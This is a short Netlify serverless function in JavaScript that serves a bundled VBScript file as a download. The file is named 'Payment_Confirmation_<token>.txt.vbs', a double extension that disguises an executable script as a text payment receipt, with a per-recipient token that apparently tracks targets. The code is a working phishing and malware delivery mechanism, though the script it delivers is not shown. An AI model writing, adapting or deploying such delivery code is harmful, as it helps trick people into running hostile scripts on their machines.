// netlify/functions/generate-file.js
const fs = require("fs");
const path = require("path");

exports.handler = async (event) => {
  const token = event.queryStringParameters.token || "unknown";
  const filename = `Payment_Confirmation_${token}.txt.vbs`;

  try {
    // <- WICHTIG: voller Pfad relativ zum Function-Bundle
    const filePath = path.join(__dirname, "netlify", "functions", "assets", "yourscript.vbs");
    const buf = fs.readFileSync(filePath);

    return {
      statusCode: 200,
      headers: {
        "Content-Type": "application/octet-stream",
        "Content-Disposition": `attachment; filename=${filename}`,
      },
      body: buf.toString("base64"),
      isBase64Encoded: true,
    };
  } catch (err) {
    return { statusCode: 500, body: `Error reading file: ${err.message}` };
  }
};
